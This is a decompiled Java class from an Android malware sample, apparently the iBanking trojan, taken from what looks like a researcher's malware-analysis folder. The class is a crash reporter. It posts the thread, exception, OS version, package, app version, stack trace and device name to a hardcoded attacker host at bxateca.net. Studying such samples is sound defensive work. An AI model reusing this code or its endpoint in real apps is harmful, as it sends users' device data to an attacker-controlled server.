import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Build.VERSION;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.HttpParams;

final class eg
  implements Runnable
{
  eg(ef paramef, Thread paramThread, Throwable paramThrowable, String paramString) {}
  
  public final void run()
  {
    DefaultHttpClient localDefaultHttpClient = new DefaultHttpClient();
    localDefaultHttpClient.getParams().setParameter("http.protocol.content-charset", "UTF-8");
    HttpPost localHttpPost = new HttpPost("http://bxateca.net/iBanking/crashlog/");
    try
    {
      ArrayList localArrayList = new ArrayList();
      localArrayList.add(new BasicNameValuePair("thread", this.jdField_a_of_type_JavaLangThread.toString()));
      localArrayList.add(new BasicNameValuePair("throwable", this.jdField_a_of_type_JavaLangThrowable.toString()));
      localArrayList.add(new BasicNameValuePair("os", "andorid " + Build.VERSION.RELEASE));
      localArrayList.add(new BasicNameValuePair("pakage", ef.a(this.jdField_a_of_type_Ef).getPackageName()));
      localArrayList.add(new BasicNameValuePair("version", ef.a(this.jdField_a_of_type_Ef).getPackageManager().getPackageInfo(ef.a(this.jdField_a_of_type_Ef).getPackageName(), 0).versionName));
      localArrayList.add(new BasicNameValuePair("stacktrace", this.jdField_a_of_type_JavaLangString));
      ef localef = this.jdField_a_of_type_Ef;
      localArrayList.add(new BasicNameValuePair("devicename", ef.a()));
      localHttpPost.setEntity(new UrlEncodedFormEntity(localArrayList, "UTF-8"));
      localDefaultHttpClient.execute(localHttpPost);
      return;
    }
    catch (PackageManager.NameNotFoundException localNameNotFoundException)
    {
      localNameNotFoundException.printStackTrace();
      return;
    }
    catch (IOException localIOException) {}catch (ClientProtocolException localClientProtocolException) {}
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/eg.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */